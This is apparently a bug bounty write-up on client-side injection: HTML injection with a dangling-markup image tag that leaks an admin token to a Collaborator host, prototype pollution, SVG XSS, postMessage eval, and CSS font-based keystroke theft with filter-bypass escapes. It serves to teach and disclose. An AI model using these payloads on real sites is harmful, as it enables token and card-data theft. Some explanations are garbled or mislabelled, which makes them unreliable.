# :globe_with_meridians: Advanced Client Side Injection Secrets Leads To (SSRF , Prev Esc)🤫

---

>

NOTE: The Write Up is Technical and hunting and The Write up Focus on Client Side Injection And common Bugs From low to Critical Get Your Coffee and Lets go If You Liked The Write up Dont Forget 50 Clapped And Thank you

## Client-Side Injection Basics: What It Is and Why It Matters

To understand Client-Side Injection, think about how websites work in the browser The browser builds the page using objects and elements that can be modified dynamically with JavaScript

The attacker exploits this dynamic to inject malicious code (such as JavaScript or HTML) into those elements which the browser then executes automatically as part of the website

## Object-Oriented Programming (OOP)

is based on creating objects that contain different attributes and data For example, in an RPG game when a player creates a character that character will have attributes like health coins inventory and more

If I were building that game as a developer the first thing I would do is create objects to represent the character and store its data

This is similar to the idea of the Document Object Model (DOM) The DOM represents a webpage as objects, where every element on the page is treated like an object that can store data and be modified dynamically

## DOM Document Object Model(DOM)The Document Object Model is just how were modeling the way data is handled within a web page Think about something like: JavaScript

```
document.location
```

```
You (Browser) Server
| |
|-------- HTTP Request (GET/) ------->|
| |
|<------- HTTP Response (HTML) -------|
| |
| |
+---v---------------------------------+
| Document Object (DOM) |
| |
| document.location = "target.com" |
| document.cookie = "session=xyz" |
| document.body = "<html>..." |
| |
+-------------------------------------+
```

Your goal as the attacker, as the bug bounty researcher is simple: Inject malicious content into that document object

### So Where Does The Attack Come In? 🔥

We can’t directly manipulate the DOM from outside But ultimately for Cross-Site Scripting, Prototype Pollution or any Client-Side Injection attack Just like Zseaon who found one vulnerable 7000 endpoint(Archive) and walked 30XSS

*Shout out To NahamSec + Zseaon — Image From Video NahamSec With [Zseaon](https://zseano.medium.com/)*

Alright so now that we understand the DOM and how it works the big question is *Where do we actually look for Client-Side Injection? *We’ve got 4 strategies lets break them down

First thing you want to do is go after the unauthenticated routes Look for: 1# Hidden subdomains — #2 Hidden applications that haven’t been tested by other researchers #3Hidden endpoints — #4 Hidden functionality

Why? Because your goal is to find something untouched and then try to inject user-controlled input to manipulate the DOM in a way the developers never intended

## First Scenario (HTML Injection Leads To SSRF) 1️⃣

While testing for HTML Injection, I found a search bar in the target application and started injecting simple HTML tags into it such as:

```
<h1>Hacked By Mado</h1>
```

*Request*

```
## But My Target its Have good filter its Delete the tag
I AM Trying other Tags For bypass it
<a href="https://evil.com" style="background:red;color:white;padding:10px;border-radius:5px;font-size:20px;text-decoration:none;margin-left:-200px;display:inline-block;"> 💀 Hacked By Mado💀</a><!--
```

## Exploiting the HTML injection (SSRF)

```
https://Admin.Target.com?<img src=“https:// <collaborator_id>.oastify.com/?test=
```

*The first part *`*https://admin.Target.com?*`* is the administration URL It is necessary for the server to accept the request*

We then create a new image tag with its source pointing to a server we control such as `<your_ID>.oastify.com` which is generated using Burp Collaborator We also add a test parameter, but we intentionally do not close the `src` attribute or the `<img>` tag so the remaining HTML content gets appended to the image URL and sent to our server

## Get Mado’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

By injecting `">` we can close the `<img>` tag early
Then everything after our injection becomes part of the image URL. When the victim opens the email, the browser loads the image from our server sending the data inside the request

When an administrator opens the email, the image will automatically be loaded and “*we will receive a request on our server” *:

```
GET /?test=?token=739f65ac-7d4d-4122-9f94-19bd17b0e7b6%3C/a%3E%20%20%3C/div%3E%20%20%20%20%20%20%3C/td%3E%20%20%20%20%3C/tr%3E%20%20%3C/tbody%3E%3C/table%3E%3Ctable%20id= HTTP/1.1
Host: lnc0nr14cvjz3l9i58is6ov0rrxdl89x.oastify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: image/avif,image/webp,*/*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
```

## Prototype Pollution → (Privilege Escalation)2️⃣

In JavaScript every object has a prototype think of it as a blueprint that every object inherits from

```
Object A Object B Object C
| | |
└────────────────────────────────> |
| |
Object.prototype ← the blueprint
(every object inherits from here)First thing I did was test if the application
```

So if we can inject a key value pair into that prototype

```
Object.prototype.isAdmin = true
|
v
Object A.isAdmin = true
Object B.isAdmin = true
Object C.isAdmin = true
```

First thing I did was throw a custom header at the server just to see what happens Turns out it reflected straight back in the response

*Test ProToType Pollution*

What does the server do when we add JSON to the request and send it?

*Inject jSON*

After sending the request With New inject key value pair showed up directly in the response

Now I’m logged in and the account is admin not editor anymore

## XSS Stored Via Svg Leads To (Open Redirect)3️⃣

When you upload an SVG file, the app renders it directly without cleaning up what’s inside it So if the SVG has something like `window.location=evil…` in it the app just runs it as is and redirects the user wherever you want

```
<svg xmlns="http://www.w3.org/2000/svg">
<script>
window.location.href="https://example.com";
</script>
</svg>
```

I crafted an SVG with malicious code inside it, uploaded it as a PFP now anyone who visits the profile gets redirected to wherever I want

Anyone who opens my profile gets redirected straight to my domain

## PostMessage + Leads to (XSS)4️⃣

What is PostMessage The `postMessage()` API is a browser feature that allows different windows or frames to communicate with each other securely

Example :

*Page of victim*

```
"AddEventListener" is Receiver Data
## Code mean if you Listener Message Do the function Called mado
eval(mado.data)
```

*Code of my site*

This code was hosted on my attacker controlled website Once a victim visited my page the script automatically interacted with the vulnerable target application and successfully triggered JavaScript execution on the victim domain

But how does this vulnerability work even though the target application uses browser security mechanisms such as (SOP) and does not (CORS)

>

The issue exists because the application trusted incoming `postMessage()` events without validating the sender origin

Since the target page could be embedded inside an `Iframe`, my attacker controlled website was able to communicate directly with the vulnerable frame using:

```
iframe.contentWindow.postMessage()
```

## PostMessage + CSS Injection Lead To (Keylogger) 5️⃣

When me Watch Video of Rhynorater + teknogeek speak about PostMessage and CSS injection I see scenario Very crazy and Very deep

*Shout out To Rhynorater + teknoGeek*

Imagine a checkout page where every single input field is isolated in its own iframe Card Number Name, and CVV each living in a separate iframe These iframes communicate with the parent page and with each other using `PostMessage`() broadcasts

```
window.addEventListener('message', (e) => {
document.innerHTML = e.data // no origin check
});
```

CSS Injection Now this is where it gets insane Imagine a checkout page where every input field is its own iframe and those iframes communicate via post message broadcasts

In CSS font definitions you can set a Unicode range meaning a font only loads for ONE specific character

So when the user types `4` their browser reaches out to Attacker Server to load that font

Most web applications that detect CSS Injection use a blacklist to block The big problem? Blacklists are very weak against CSS

CSS Have very Simple solution CSS is extremely flexible and allows the same code to be written in multiple ways This makes bypassing filters relatively easy

Practical Bypass Examples: We need bypass “import” + “@font-face”

```
/* Normal (usually blocked) */
@import url("evil.css");

/* Bypass techniques (these often work) */
\40 import url("evil.css");
\000040import url("evil.css");
\@import url("evil.css");

/* Normal */
@font-face { ... }

/* Bypass */
\40 font-face { ... }
\000040font-face { ... }
\@font-face { ... }
```

### Final Result (Simple Explanation)

The attacker successfully stole the victim full credit card number using only CSS Here how it happened step by step:

Step 1: The attacker tricked the victim into opening the checkout page

Step 2: He injected malicious CSS into the credit card iframe

Step 3: He bypassed the website CSS security filters using Unicode escaping tricks

Step 4: He created 160 different fonts each font linked to one specific character (one for “0”, one for “1”, one for “4”, etc)

Step 5: Every time the victim typed a number (for example “5”): The browser automatically tried to load the special font for “5” from the attacker server → The attacker saw the request and knew the victim just typed “5”

Step 6: He repeated this for every digit the victim typed, and successfully got the complete credit card number digit by digit

### All This Bugs Severity is : Medium — Critical

*My signature*

……………Thank You For Reading And I hope This Was helpful………………

---
